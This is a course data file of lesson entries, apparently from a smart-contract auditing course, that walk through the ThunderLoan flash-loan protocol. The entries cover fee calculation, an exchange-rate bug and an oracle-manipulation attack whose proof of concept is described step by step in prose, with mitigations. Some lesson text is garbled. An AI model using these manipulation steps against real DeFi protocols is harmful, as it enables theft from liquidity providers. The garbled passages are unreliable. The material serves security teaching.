          In conclusion, while blockchain functions like `deposit` and `redeem` can look complicated, breaking them down and understanding what each element does turns these seemingly convoluted calculations into understandable steps. As with anything in blockchain, the devil is in the detail - and it's safe to say we've captured all of them here. Stay tuned for more deep dives into the world of blockchain functions!
        description: 'Token Deposit & Redemption, NAT Spec & Exchange Rates. Importance of clear docs, maths checks, avoiding re-entrancy attacks, using Chisel for code verification.'
      -
        id: bca8e64a-09ac-40e0-a723-f0100b143e4d
        type: new_lesson
        enabled: true
        title: 'ThunderLoan flashLoan'
        slug: thunderloan-flashloan
        duration: 14
        video_url: mIat702o8cYQBwwz9jQMIXOO855n02G2sn26Wu9wwQFmQ
        raw_markdown_url: /routes/security/6-thunder-loan/33-thunderloan-flashloan/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol - Flashloan
          ---

          # Understanding the Flash Loan Function

          In reviewing, understanding, and working with the flash loan function in a smart contract, I encountered a few challenges due to the lack of a Nat Spec. But fear not, in this blog post, we'll walk through it, figure out what each parameter does, and build the Nat Spec ourselves.

          ## Decoding the Parameters

          ![](https://cdn.videotap.com/70D5PzXZylGPTZ8Ak7ea-44.44.png)

          The main parameters in the flash loan function are:

          - Receiver address : This is probably the address that should receive the flash-loaned tokens, essentially, where to send the borrowed tokens.
          - ERC 20 : This is the token you want to borrow.
          - Amount : Obviously, this would be the amount you want to borrow.
          - Params : These are the function call parameters for the receiver address. Meaning, when the flash loan function sends the tokens to the receiver address, it will also send these parameters. It is important to note here that the receiver address is expected to be a smart contract.

          ## Function Breakdown

          To get a better understanding, we should examine each line of the function.

          ```
          revert is 0;revert if not allowed token;
          ```

          While these lines may seem perplexing, they are simple checks, the first is to ensure that the function does not revert right out of the gate and the second verifies that the token is allowed. To understand this, you can look into the `isAllowedToken()` function.

          ```
          Asset token = s_2 asset token of the token.
          ```

          Here, `assetToken` is the contract that holds the underlying tokens we want to borrow.

          A critical part of the function is getting the `startingBalance` of the asset token contract, which will come in handy later on when we verify if the flash loan has been repaid.

          If the `amount` to borrow is more than the `startingBalance`, it means that the function is trying to borrow more than the total available tokens, and it will resultantly revert and terminate the operation.

          In addition to the checks mentioned above, the function verifies the code length of the receiver address. If it equals zero, the operation is once again reverted.

          ## Understanding the Fees

          ![](https://cdn.videotap.com/nrDYkgtsrD1YCbh5GO4J-474.07.png)One thing that might seem confusing initially is how they calculate the fee. `getCalculatedFee()` is the function that gets used for that. It's important to note that this fee is the contract's charge to facilitate the flash loan operation.

          To make more sense of this, it's useful to go back to this line:

          ```
          AssetToken.updateExchangeRate (fee)
          ```

          Here, the `updateExchangeRate` of the `AssetToken` contract is getting updated with the `fee`. In essence, this step ensures the protocol updates the exchange rate so that everything adds up mathematically with the introduction of the new fee.

          > It's important to pause here and do some quick math to fully grasp the impact of the fee on the exchange rate.

          ## The Flash Loan in Action

          ![](https://cdn.videotap.com/m50tzcSXOfTUOdDNWqXL-622.22.png)Now that we have understood what each parameter does, we can actually do a quick run-through of the function. Here are the steps:

          - The user calls the flash loan requesting for a specific amount of a specific ERC20 token.
          - The function verifies the code length of the receiver address and the amount of the requested token, checks the starting balance of the underlying asset token contract, and verifies if the flash loan has been repaid.
          - If all checks out, the necessary amount of tokens are transferred to the receiver address via `AssetToken.transferUnderlyingTo()`.
          - The function interface calls the `executeOperation` of the receiver contract using the provided params for further operations.
          - Ultimately, it expects the receiver contract to call the `repay` function, sending back the borrowed amount plus the fee.

          ## Conclusion

          Walking through this function sheds light on how a flash loan function works in conjunction with other pieces of a smart contract. However, it's always critical to do your own due diligence and research, check out how other protocols implement similar functionalities, and learn from existing work.

          Happy coding!
        description: 'A review of the flashLoan function in ThunderLoan.sol. Patrick continues his search for vulnerabilities.'
      -
        id: cc8b39c4-b859-4c01-a12a-45e910bac4bf
        type: new_lesson
        enabled: true
        title: 'Note On Being Discouraged'
        slug: note-on-being-discouraged
        duration: 1
        video_url: hOBNkY3LshFw5mv9WRuS61yKT477CvLgoPFeV6yzsIw
        raw_markdown_url: /routes/security/6-thunder-loan/34-note-on-being-discouraged/+page.md
        markdown_content: |-
          ---
          title: A Note On Being Discouraged During The Audit Process
          ---

          # Understanding the Complexity of Codebase Audits: An In-Depth Exploration

          In the world of coding, auditing your codebase is akin to a treasure hunt. Only in this case, the treasure isn't chests of gold and diamonds, but issues and flaws that need to be addressed. It‚Äôs a crucial process for maintaining code quality and ensuring your app's security. At times, the search can appear discouraging, especially when a clear solution or bug isn't immediately evident. This blog post will dive into the complex world of codebase audits and why it may sometimes feel like you're going around in circles, even though you‚Äôre on the right track.

          ![](https://cdn.videotap.com/zCv8VBC70weROS4c3wJa-1.69.png)## Unraveling the Codebase: Do You Have Any Audit Highs?

          Having reached this point, you're likely deep into your codebase, scanning various components and notes, and your eyes may have become glossed over with `SRC` entries. You‚Äôve probably posed the question ‚ÄúDo we have any audit highs?‚Äù

          There's no sugarcoating it: learning that you haven't unearthed any 'high' flag issues may feel deflating. After all, you‚Äôre searching for bugs that pose serious risk and, logically, finding a higher risk issue means you‚Äôre making progress, right? Unfortunately, this reasoning skips a very important point: security reviews are not linear.

          It's not as simple as starting at Point A and proceeding seamlessly to Point B. Sometimes, you only find small, lower-risk issues. Sometimes, you hit a wall. And occasionally, you find exactly what you've been looking for.

          ## Perseverance is Key: Addressing Absence of Medium-category Issues

          The feeling of dismay might deepen when you move to the next level - the medium-category issues, only to discover a similar scenario ‚Äì no apparent bugs. These mid-level issues often provide a balance between complexity and harm potential, making them valuable finds during the audit process.

          The very absence of any high or medium level issues might make you question - ‚ÄúWhat's going on?‚Äù

          And this is where the answer starts to become apparent.

          > **Remember, security reviews are not linear.**

          ## The Non-linear Nature of Security Audits

          Just as with any code review, a ton of questions may spring up, some of which will remain unanswered. Within these mysteries could be hidden the very bugs you seek. You might have already spotted some bugs but dismissed them because they didn't fit into the 'high' or 'medium' categories you were actively searching for.

          That‚Äôs why it‚Äôs so important to remember that path isn't a straight line. It might feel like you're going in circles, but each review, each question asked, and each bug found is a step forward.

          Remember, it‚Äôs not about high or medium issues; it's about the hunt for irregularities that can compromise your application's security. It‚Äôs arduous and often tedious, but that doesn‚Äôt mean you‚Äôre not making strides. Every time you cycle through your code, peering at it from all angles, you're gaining a broader perspective and understanding of how your codebase functions.

          ## Conclusion: Keep Going

          So, next time you find yourself wrapped up in a painstaking codebase audit, don‚Äôt be discouraged if you‚Äôre not finding high or medium issues. Remember the nature of security reviews‚Äîthey are complex, they are multifaceted, and they are definitely not linear.

          Keep going, keep searching, and trust that while the path may seem winding and peppered with dead ends, it is leading you to a more robust and secure codebase.
        description: "'Discouragement during security review: Non-linear progress & perseverance.' Patrick highlights important points on remaining motivated."
      -
        id: 177ebf9d-fe5d-40e0-9892-5757986d60ff
        type: new_lesson
        enabled: true
        title: 'ThunderLoan Repay Final Functions'
        slug: thunderloan-repay-final-functions
        duration: 8
        video_url: Ee00dg01KILGC00j6gt18HujZeTD952asb5VyFl01L6Tt2A
        raw_markdown_url: /routes/security/6-thunder-loan/35-thunderloan-repay-final-functions/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol - Repay and Final Functions
          ---

          Title: Simplifying Cryptocurrency - Understanding and Breaking Down the Repay Function on Thunder Loan Contracts

          Welcome to the intriguing world of Thunder loan contracts! Today, we'll dive into the complexities of the repay function and how it fits into the broader cryptosphere.

          ## Repay Function: An Overview

          You may wonder why users are expected to use this foundation of Thunder loan contracts. The repay function could be termed a helper function as it essentially facilitates the transfer of tokens from the message sender to the asset token.You could choose to use this function or proceed with a direct transfer.

          ![](https://cdn.videotap.com/clirVfwioc458w6aVh7V-53.02.png)> _Quick Note:_ Direct transfers can be initiated by simply calling the transfer function and then directing tokens to the asset.

          In our evaluation, the repay function passed the net spec check with flying colors. It contributes significantly to the handling of allowed tokens in the contract.

          ## Decoding getCalculatedFee

          One question that is often asked is whether this function calculates the fees of the flash loan. To answer this straightforwardly, yes, it does! The getCalculatedFee function appears not only in the flash loan but is also utilized in the deposit aspect.

          ![](https://cdn.videotap.com/6mvrIM7OsjoztStUZ3t8-127.26.png)

          In terms of decision-making, the question now arises: how does getCalculatedFee calculate the fee?

          In simple words, it first gets the value of the borrowed token by multiplying the amount by the price in WETH. Importantly, this is sourced from the Oracle upgradable getPriceInWETH, which in turn uses the TSWAP Oracle to calculate the value of the borrowed token.

          The 'flash loan fee,' then calculated, divides the calculated value by some fee precision. From here, it applies a 0.3% fee based on the value of the token rather than the actual token amount.

          ## Digging Deeper

          In delving into the code, we find that getPriceInWETH derives the price of one pool token in WETH.

          ![](https://cdn.videotap.com/jZtPSFvT2rr7Jszw6QmJ-286.33.png)

          Firstly, it's important to revisit TSWAP to further understand this function, particularly how it calculates the amount based on input and output reserves. It raises a potential area of concern. Within an auditing context, we could ask:"What if the token has six decimals? Would it then distort the price calculation?"

          > _Critical Outlook:_ Ignoring token decimals could result in inaccurate price calculations, especially when working on the basis of TSWAP decks for determining the flash loan fee.

          While this looks plausible, it may still not be entirely correct. Circumspection is needed at this point, and we would do well to return and probe further.

          ## Addressing Minor Questions

          After reviewing the functions like updateFlashLoanFee, isAllowedToken, and getAssetFromToken, we now move on to view functions. The authorizeUpgrade function is particularly interesting as it underlines why we ought to understand proxies in detailed terms.

          ![](https://cdn.videotap.com/xKIHOvSLAXgodeugEkw9-381.77.png)

          In essence, adding the _only owner_ stipulation in the authorized upgrade function restricts contract upgrades to the owner alone. Take away this extra layer, and you throw open the door to anyone upgrading the contract!

          In conclusion, our initial pass through the Thunder Loan contracts codebase may not have uncovered any distinct issues. But it certainly has left us with questions that need answering, and that‚Äôs where the real fun begins!

          ## Onwards and Upwards

          Cracking the code behind algorithms in the cryptosphere may seem incredibly daunting. But remember that the key lies in taking one step at a time, going back to your questions, and digging deeper to find the answers.

          ![](https://cdn.videotap.com/SeBnhlFpXSRHJX757F1r-434.79.png)

          Join us in our next post for a further breakdown of these questions ‚Äì who knows, we might uncover new insights in our exploration of Thunder Loan contracts. Until then, happy coding!
        description: 'Focuses on the repay function and getCalculatedFee function, highlighting their features and potential areas of improvement.'
      -
        id: 59f203cb-1a3d-4aa0-86a2-4cd7faaf1785
        type: new_lesson
        enabled: true
        title: 'Answering Our Questions'
        slug: answering-our-questions
        duration: 9
        video_url: 4oCBj00yM8y8cNhVqZdHkFscX8kceq2I101aCKxCrKgYA
        raw_markdown_url: /routes/security/6-thunder-loan/36-answering-our-questions/+page.md
        markdown_content: |-
          ---
          title: Answering Our Questions
          ---

          ---

          # A Deep Dive into T-SWAP: Unpacking Questions and Bugs

          In our exploration of the intricate protocol called T-SWAP, we're going to be asking some hard questions and unraveling complex aspects. The key thing about crypto dApps is you need to understand their working down to the bare-bones in order to exploit or protect against potential vulnerabilities.

          To make the exercise simple, we will treat the hard-hitting questions as dialogue, with each question and answer followed by a quick analysis or piece of advice.

          Let's jump in.

          ## Q1: Why are we using T-SWAP?

          We're using T-SWAP to get the value of a token so that we can calculate fees. Sounds simple enough, right? However, this leads us to another question.

          ## Q2: Why are we only using the price of a pool token in WETH (Wrapped Ethereum)?

          This is the part that may sound a bit odd. Why are we getting the price in WETH when our primary objective is the price of the token? We're using this pricing in `calculateFee` or `getCalculatedFee`. This calls the `getPriceInWETH`, but for a scenario where we have a flash loan, it's not making much sense.

          ![](https://cdn.videotap.com/Ko9tuGIzxt2a7EKvdpiz-189.39.png)

          "If we intended to get the price in WETH then the fee should probably be in WETH," I hear you say. And you're right. This `getCalculatedFee` seems off. How can one USDC plus 0.3 USDC make sense when the fees are being calculated using `getPriceInWETH`? This could be a potential bug in the software.

          At this juncture, we must determine the impact and likelihood of this bug.

          ## Potential Bugs in Fee Calculation

          First off, let me assure you - we're not expecting you to grasp everything the first time around. Crypto security is rife with quirky implementations that some might consider "weird wonkiness."

          Here's what we're dealing with - Whenever a fee gets calculated, it uses this potentially flawed method. If this is not the intended functionality, that's a problem! The audit likelihood might be high, leading to a 'medium to severe disruption of the protocol' and the impact could be either medium or high.

          > **Quote:** "If the fee is going to be in the token, then the value should reflect that. But in current scenario it's super weird. We're getting the value of the borrowed token in units of WETH, and we're increasing the fee in units of WETH and USDC.

          ## Q3: Weird ERC20s with USDC

          Now, let's move onto the next question. What if USDC blacklists the loan contract? USDC is behind a proxy and could be upgraded anytime, which could potentially 'wreck' the protocol. This could lead to a freeze on the whole protocol. This is crucial to discuss in private or competitive audit.

          But remember, the rules in competitive audits _usually_ are: 'if a user is denied service or removed, too bad. However, if a user's denial affects others, that's usually an accepted finding in a competitive audit'.

          In case of ERC20s, in competitive audits, these are often not considered valid findings. Sure, you need to keep the clients aware in a private audit, but competitive audits call for more pressing issues. We'll rate this an audit medium, maybe an audit low.

          ## Q4: Decimals with Token - Can the Price be Wrong?

          Now, this is an intriguing aspect. Please note that for this blog, we're going to skip over this question. But here's a challenge to you, the reader, if you think you can answer it better: If a token is characterized by weird and different decimals, can the price be wrong?

          Here's a nugget of wisdom: Always be thinking about these types of things. Find out if you can break the protocol by using weird tokens with weird decimals.

          ## Q5: Is `feePrecision` Misplaced?

          This code deep dive also raises the audit question on whether the `feePrecision` value, which is currently a storage variable, could be better served as a constant immutable.

          That covers some of our perplexing questions about T-SWAP, and we've unfortunately stumbled upon a few potential bugs! But hey, it's better to discover them now in an audit than later when the damage could be far more considerable.

          The key takeaway from this exploration is the importance of meticulous analysis during crypto dApp development. Every piece of code should be audited carefully to ensure it's bug-free and works as intended.

          I hope this blog enriched your knowledge about potential pitfalls and the need for audacious questions during protocol designing process.

          Remember, in the complex world of crypto, curiosity doesn't kill the cat; complacency does!
        description: 'Patrick begins answering the questions we posed earlier in our review of Thunder Loan based on our scoping experience.'
      -
        id: 7246ca88-7397-43b7-9500-87bb15eafa70
        type: new_lesson
        enabled: true
        title: 'Improving Test Coverage To Find A High'
        slug: improving-test-coverage-to-find-a-high
        duration: 16
        video_url: 02CWQ02hUiGoFVcMcbSN00LUYOtzjbmQjC4FXWTa859bvQ
        raw_markdown_url: /routes/security/6-thunder-loan/37-improving-test-coverage-to-find-a-high/+page.md
        markdown_content: |-
          ---
          title: Improving Test Coverage To Find A High
          ---

          # Unraveling the Mystery: Decoding Flash Loan Fees and Exchange Rate Updates

          As we delve deeper into the complexities of DeFi protocols, we find ourselves constantly asking - Why? Why are we calculating the fees of a flash loan in the deposit? And why are we updating the exchange rate? Isn't it a bit strange to perform these updates here?

          To unravel this puzzle, we embarked on an audit trail that led to some unexpected discoveries and revelations.

          ## Deciphering the Problem: Understanding Exchange Rates and Flash Loans

          The first oddity we noticed was the update of the exchange rate in the deposit function when adding fees. This process typically only commences when there's a significant increase in the total amount of money in the asset token. It seemed illogical that the deposit function, which accrued no fees, was responsible for this update.

          If the update exchange rate was malfunctioning, it would have repercussions on the 'redeem' function - our protocol's withdrawal mechanism. To confirm our suspicions, we needed to test this function first.

          ## Running the Test: Examining the 'Redeem' Function

          To validate the functionality of the redeem function, we had to initiate a test. We decided to write a test for the redeem function and simulate a scenario of borrowing from the test flash loan and then attempt to redeem.

          We commenced with the test by first setting up a mock Flash Loan receiver with a specified fee, which would be used for the Flash Loan.

          The test would first change the exchange rate by depositing some funds, then modify it again by initializing the Flash Loan. ideally, at this stage, the depositor should be able to withdraw all their money.

          ![](https://cdn.videotap.com/NHVntHvDBDp2yLjdahS4-377.57.png)

          ## The Unexpected Revelation: Insufficient Balance

          The test, unfortunately, produced an unexpected outcome - Insufficient balance.

          After analyzing the logs of the transactions performed during the test, we noticed that the 'transferUnderlyingTo' function was returning an error stating insufficient funds. The amount to be transferred back (1003 tokens) was higher than the initial deposit (1000E 18).

          This discrepancy threw us off balance. We had triggered a Flash loan, and expected to incur a fee, but the increase in the withdrawal amount surpassed the fee incurred. Upon scrutinizing the deposit function once again, we discovered an uncanny occurrence - the exchange rate was updating the fee.

          The exchange rate, which was originally responsible for tracking the total amount of money in the protocol at all times, had now charged a fee without any transaction taking place.

          This detrimental coding error was affecting liquidity providers' ability to redeem their tokens, setting off alarm bells for us.

          ## Assessing the Damage: Decoding the High

          To ascertain the gravity of the impact of this error, we performed a follow-up test with the problematic lines of code in the Thunder loan commented out. As expected, the test passed, solidifying our suspicion. The initial mock test we developed served as a proof of code that affirmed our findings.

          ![](https://cdn.videotap.com/liERWQdBJtLyf0Oj21Oc-556.43.png)

          The paramount error was evident - the erroneous exchange rate update in the deposit function. This update was blocking redemptions and incorrectly setting the exchange rate, leading to severe disruptions in the contract functionality.

          The likelihood of this recurring was high due to its occurrence every time someone deposited. The impact, too, was high as users' funds would be locked. Moreover, rewards were incorrectly calculated due to reward manipulation leading to users potentially getting way more or less than deserved.

          ## Mitigating the Threat: Towards a Safer Protocol

          Having extensive experience in blockchain security, we carefully devised a countermeasure to neutralize this imminent threat.

          Through our persistent efforts probing into the code, we have managed to reveal a glaring irregularity that could have potentially endangered the whole protocol. The mandatory removal of this erroneous exchange rate update from the deposit function could significantly impact the protocol, making it safer and more secure, offering a fortifying solution to this daunting mishap.

          And, as we continue ahead in our journey, probing for more security vulnerabilities and solving them, we learn that most bugs tend to surface towards the end of the audit. As our understanding of the protocol deepens, we get better at detecting potential threats, eventually leading to a more secure eco-system for all.
        description: 'Writing tests to improve code base coverage can be a great way to spot vulnerabilities early in a review, Patrick demonstrates.'
      -
        id: 8564f658-ef5f-4c3f-9f4b-9cb564b5f609
        type: new_lesson
        enabled: true
        title: 'Exploit: Oracle Manipulation'
        slug: exploit-oracle-manipulation-intro
        duration: 2
        video_url: 2xZ01jBXrDLTsaU01q1GTXGd00DlAlDDq64RfC4RB1iMe8
        raw_markdown_url: /routes/security/6-thunder-loan/38-exploit-oracle-manipulation-intro/+page.md
        markdown_content: |-
          ---
          title: Exploit - Oracle Manipulation - Introduction
          ---

          # The Art of Debugging: A Deep Dive into Oracle Manipulation

          Hello Code Lovers! We're back with another exciting and intriguing chapter of our journey today. So, keep your curiosity alive as we have some complex but fascinating issues to untangle.

          ## Unravelling the Mystery: Deleting a Mapping

          First things first ‚Äì let's delve into one compelling question that's been troubling us: Does deleting a mapping work? Remember, the key to successful debugging is not just fixing the bug, but comprehending the reason behind it.

          After a thorough examination, we did come across some irregularities earlier. But with our renewed focus, let's try to unlock this puzzle.

          ![](https://cdn.videotap.com/EDZ935DJCvseMdojYDqQ-15.74.png)

          ## Decoding the Fee Calculation Conundrum

          Moving on to another important question: How does the fee get calculated? Now, if you'll recall from our previous discussion, we uncovered some strange issues concerning the fee represented in the token.

          Without getting bogged down by the past problems, let's scrutinize if there's a deeper complication here, especially with the usage of T-SWAP as the protocol.

          On a side note, this is an instance where the wisdom derived from previous experience comes into play. It's essentially when debugging starts resembling a thrilling treasure hunt - the more treasures (read: issues) you uncover, the more experienced and capable you become.

          So, roll up your sleeves as we uncover a grave inconsistency embedded in the depths of this code.

          ![](https://cdn.videotap.com/ILyKyCIUBPHesdezqO7A-34.63.png)

          ## The Hidden Dragon: Oracle Manipulation Issues with AMM

          As we delve deeper, there's a staggering hiccup with using the reserves of a Decentralized Exchange (DEX) or an Automated Market Maker (AMM), like TSwap. Did you know the reserves' modification could drastically alter the price, thus jeopardizing the entire protocol?

          Consider, for instance,If you could alter the reserves in TSwap, it, in turn, alters the price and disrupts the entire protocol.

          This brings us to our next cornerstone - understanding Oracle Manipulation, to determine any potential malfunctions leading to a breach.

          ![](https://cdn.videotap.com/Dq8ETmltBDcUUQFSFh4o-56.67.png)

          ## Oracle Manipulation: Spotting the #1 Attack Vector of 2023

          There's a critical question to address here: What's the likelihood of a breakdown? And if it exists, can it expose the system to potential hacks?

          If you're in tune with the trends, then you most certainly know that Price Oracle Manipulation topped the list of attack vectors for the first half of 2023. It's essential to have a clear understanding of how it operates, how to steer clear of it and, most importantly, spotting this concern.

          Unfortunately, the problem is commonplace in competitive audits, private audits, and also manifests "in the wild."

          Let's delve into this vast sea of knowledge, which may seem intimidating for beginners but indeed holds the key to amending this widespread issue.

          ![](https://cdn.videotap.com/DFzBDvQKrlAS9RSlOvGX-75.56.png)

          ## In Conclusion

          So let's start snowballing now and romp through this course! Debugging and solving these issues will give you a giddy sense of accomplishment. More importantly, learning to identify these potential landmines can equip you to deal with an array of daunting challenges in your coding journey. Happy Debugging!
        description: 'Patrick uncovers and details an oracle manipulation vulnerability within Thunder Loan.'
      -
        id: ec5a245b-0240-4ebe-8389-35259b0e7af7
        type: new_lesson
        enabled: true
        title: 'Oracle Manipulation: Minimized'
        slug: exploit-oracle-manipulation-minimized
        duration: 10
        video_url: q4GhJAaGGAGtpuGbtE6jrfwZWH00wO701PHNn67Bdz99M
        raw_markdown_url: /routes/security/6-thunder-loan/39-exploit-oracle-manipulation-minimized/+page.md
        markdown_content: |-
          ---
          title: Exploit - Oracle Manipulation - Minimized
          ---

          # Utilizing SC Exploits for Oracle Manipulations in Blockchain Protocols

          In the whirlwind universe of blockchain protocols, there lies a fascinating yet notoriously common class of vulnerabilities that all budding developers should be aware of - Oracle Manipulations. The term "Oracle" refers to an entity that helps blockchain protocols interact with the outside world by providing them with real-world data. In this article, we'll delve deep into the world of SC (Smart Contract) exploits, examining a particular vulnerability concerning Oracle manipulations and how it can be leveraged for profit.

          ![](https://cdn.videotap.com/7l5XeduNYadMolRpvY1p-27.77.png)

          ## A Basic Understanding of Flash Loans

          First things first, let's recap an elemental concept - Flash loans. To keep it simple, flash loans are loans that allow you to borrow assets without any collateral, with the condition that you return them within a single transaction.

          Here's a basic formula for a flash loan:

          1. An entity calls for a flash loan.
          2. They get the loaned asset (say, a particular cryptocurrency).
          3. They carry out an operation or multiple operations using the asset.
          4. Finally, they return the money within the same transaction.

          ## SC Exploits and Oracle Manipulations - How Does It Happen?

          Let's walk through an example of how these exploit works. Consider a common situation where we have a decentralized exchange, TSwap for instance. Within TSwap, you have two liquidity pools, as in all traditional DEXs. Let's say these pools hold 100 USD Coin (USDC) and 10 Wrapped Ether (WETH) respectively.

          Given the current holdings, the ratio of USDC to WETH in this pool is 10:1. This means that you could theoretically get 1 WETH for 10 USDC, ignoring slippage and other factors.

          So, what happens if our savvy exploiter decides to take a flash loan?

          Let's say the entity takes out a flash loan of 1,000 USDC. Instead of using this for the usual operations, they decide to swap it onto TSwap, pushing its USDC reserves up to 1,100. This drastically changes the ratio in the pool, making WETH significantly more expensive in terms of USDC.

          The trick here, however, is that all of this is happening within the timeline of a single transaction. To an outside observer (including other smart contracts), it looks like for a brief moment, the price of WETH has soared.

          ## The Consequences of Price Manipulation

          If another protocol that uses Tswap's price feed to determine the price of certain assets, it would momentarily read this wrong price. Assume a protocol, which we call Protocol 'Whoops', mints NFTs at a rate pegged to the price of WETH. The hacker can temporarily buy these NFTs for cheap, sell them for a profit, and then pay back the flash loan - all in one transaction!

          We can see how exploiting oracle manipulation can be quite a lucrative business - but only for those equipped with in-depth knowledge of blockchain, smart contracts, and DeFi protocols.

          ## The Thunderloan Example

          Consider the Thunderloan contract, which is a perfect representation of such exploits. It uses a TSwap-like decentralized exchange as its price oracle, creating a significant risk as flash loans can manipulate the price feed quite conveniently. Thus, a savvy exploiter could utilize a flash loan from Thunderloan to manipulate Thunderloan itself.

          You can explore further on oracle manipulation exploits by checking out the SC exploits in the "minimized" section on Github. It includes a detailed example of Oracle manipulation and how it played out, including everything needed for you to try and test it yourself in a local environment.

          ## Notable Incidents

          One notable case that stands out in history is the Cream Finance attack that took place in 2021. The attacker exploited a pricing vulnerability by lending and borrowing flash-loaned funds between two addresses, wreaking havoc on Cream's financial assets.

          The Cream Finance attack is not unique; several other significant and minor hacks have been carried out over the years that involve similar exploit methods. Therefore, be it as a developer on the lookout for bugs in your protocols or a crypto enthusiast looking for loopholes, understanding oracle manipulation attacks should be in your toolkit.

          ## Conclusion

          Oracle manipulation is an intriguing and unfortunately prevalent attack vector within blockchain protocols. It is crucial as developers, stakeholders, and enthusiasts to understand such vulnerabilities to build, invest, and operate more securely within the crypto space.
        description: 'Patrick showcases a minimalistic example of the Oracle Manipulation vulnerability.'
      -
        id: 6a890d64-3b94-4fba-907a-935065ff8efd
        type: new_lesson
        enabled: true
        title: 'Oracle Manipulation: ThunderLoan Poc'
        slug: exploit-oracle-manipulation-thunderloan-poc
        duration: 29
        video_url: a4UbnhGl8ThvI00EdJPma8Jmtj01oQlaB3cJT8HsI302WI
        raw_markdown_url: /routes/security/6-thunder-loan/40-exploit-oracle-manipulation-thunderloan-poc/+page.md
        markdown_content: |-
          ---
          title: Exploit - Oracle Manipulation - Thunder Loan PoC
          ---

          # Exploiting Oracles with Flash Loans

          Oracles play a critical role in blockchain systems by providing external data to smart contracts. However, improperly designed oracles can lead to devastating oracle manipulation attacks. In this post, we will demonstrate an advanced oracle manipulation attack using flash loans.

          ## Overview

          ![](https://cdn.videotap.com/kM0YOBTs7t8WreMLhr2A-49.5.png)We recently audited a lending protocol called ThunderLoan that relies on a DEX called TSWAP for price feeds. By exploiting TSWAP with flash loans, we will manipulate prices and extract cheaper flash loans.

          This is an extremely advanced attack that combines:

          - Flash loans
          - Oracle manipulation
          - Arbitrage bots
          - DEX price manipulation

          ## Exploiting the Oracle

          To manipulate the price oracle, we will:

          1. Take out a flash loan of 50 **tokenA**
          2. Use the loan to manipulate TSWAP reserves
          3. Take out another flash loan for a hugely reduced fee

          When `maliciousFlashLoan` is called:

          1. The first 50 token loan dumps onto TSWAP, manipulating prices
          2. The second 50 token loan has a massively reduced fee due to the price change

          ### Full Exploit Code

          ![](https://cdn.videotap.com/xK2fynd4EnHBvr8emyyD-1501.5.png)

          It's very complex but essentially:

          1. Borrows 50 tokens
          2. Swaps them on TSWAP, nuking the price
          3. Borrows another 50 tokens for cheaper
          4. Checks the fee is reduced
          5. Repays everything

          Running the code proves fees are drastically reduced by the attack.

          ## Impact

          This attack allows attackers to take flash loans for extremely cheap. They circumvent the protocol's fees and essentially get free money.

          We classify this as a medium severity issue. It's unlikely to be exploited in the wild due to complexity, but if it was, it could seriously compromise sustainability.

          ## Recommended Mitigation

          The root cause is using on-chain DEX reserves to price assets. This is easily manipulated.

          Instead, we recommend decentralized oracle solutions like:

          - Chainlink Price Feeds
          - Uniswap TWAP

          These are robust against manipulation, ensuring accurate prices even during attacks.

          We hope this post has provided valuable insight into advanced oracle manipulation attacks in blockchain systems. As protocols expand in complexity, deeply understanding these attacks will prove invaluable to engineers and auditors alike.
        description: 'Patrick walks through a proof of code for our identified oracle manipulation vulnerability.'
      -
        id: 14bf10cf-959a-4040-862f-e91241459691
        type: new_lesson
        enabled: true
        title: 'Oracle Manipulation: Recap'
        slug: oracle-manipulation-recap
        duration: 3
        video_url: zfn2qV1R9DLzY01cCx0202A1AmKMgv01JD2CQ6jDjqRu4k4
        raw_markdown_url: /routes/security/6-thunder-loan/41-oracle-manipulation-recap/+page.md
        markdown_content: |-
          ---
          title: Oracle Manipulation Recap
          ---

          # Flash Loans: Making Blockchain Arbitrage Accessible

          Arbitrage, the simultaneous buying and selling of assets in different markets to take advantage of differing prices, has long been an effective strategy for the 'financially fearless' among us. A concept traditionally dominated by the deep-pocketed whales of Wall Street, the decentralised finance (DeFi) world is flipping the field on its head with the application of flash loans.

          Can't tell your flash loans from your DeFi? No worries, mate. Let's dive deep into it all and level the arbitrage playing field!

          ### The Magic of Flash Loans

          But what's a flash loan? A flash loan is a loan that lasts exactly one transaction! Quite an alien concept to anyone versed in traditional finance, this tool is peculiar and unique to the DeFi blockchain realm.

          ```markdown
          "It is a loan that lasts exactly one transaction."
          ```

          ![](https://cdn.videotap.com/VtEQgP01EvzX42ymoqp1-45.63.png)

          Why so peculiar, you ask? That's because a flash loan smart contract can stipulate 'if you don't pay me back, I will just revert everything that you've done'. Imagine the applications!

          ### Where the Whales Swim: An Example

          This is where it gets interesting. Major players (whales) deposit large sums of money into protocols that host flash loans. Why? Because every flash loan carries a fee, incentivising whales to keep their money safely in the protocol. But how does this tie into arbitrage, and why should we care?

          Well, let's scope out a practical application of flash loans in our arbitrage world.

          Imagine two different cryptocurrency exchanges present a price discrepancy for the same asset. If you had the funds, you could buy from one exchange at a lower price and sell on the other at a higher price, making a neat profit. This requires substantial initial investment to explore, which is where flash loans change the game completely.

          Flash loans democratize the arbitrage domain, allowing even the smallest fish in the sea to swim amongst the whales. By providing the funds for the duration of one transaction, users can perform arbitrages without owning the requisite amount at the outset!

          ### Flash Loans and DeFi: A New Era of Financial Democracy

          In a regular finance landscape, opportunities for arbitrage are available exclusively to the wealthy class. The DeFi landscape transforms the traditional constructs of finance by opening these virtual doors to anyone and everyone. Flash loans are an empowering tool for the smaller fish to leapfrog the barriers of entry and start swimming in the arbitrage ocean.

          ```markdown
          "DeFi levels the playing field and allows anyone to take advantage of these opportunities."
          ```

          ### Life in the Flash Lane: From Arbitrage to Collapse

          Another fascinating interaction that can occur between flash loans and DeFi protocols involves ‚Äòprice manipulation‚Äô. Here, users leverage flash loans to manipulate the price on a decentralized exchange (DEX), resulting in opportunities for further trading advantages.

          ![](https://cdn.videotap.com/0dhGroKi4k72ZIMv0UAb-130.37.png)

          This tactic is illustrated in a test we conducted using an imaginary 'Thunder Loans' protocol. We set it up, requested a flash loan, and manipulated the reserve ratios of the DEX, causing a significant change in price. This setup enabled us to borrow another flash loan, this time with a substantially lower fee due to the manipulated rates.

          This might sound somewhat unscrupulous, as the liquidity providers (the whales) lose out, yet the strategy worked. We completed all the necessary moves, hit the 'Thunderloan flash loan' button, manipulated the contract code, ensured the change in reserves, and witnessed the price drop from a 1:1 ratio down to a 1:2 ratio.

          Finally, we executed another flash loan, leaving us with a drastically cheaper fee due to our manipulations with the initial flash loan. We then repaid this loan, leading us into an intriguing question: What if we didn't need to repay?

          ![](https://cdn.videotap.com/CTDan8syFjGyGDy0iJ02-156.44.png)

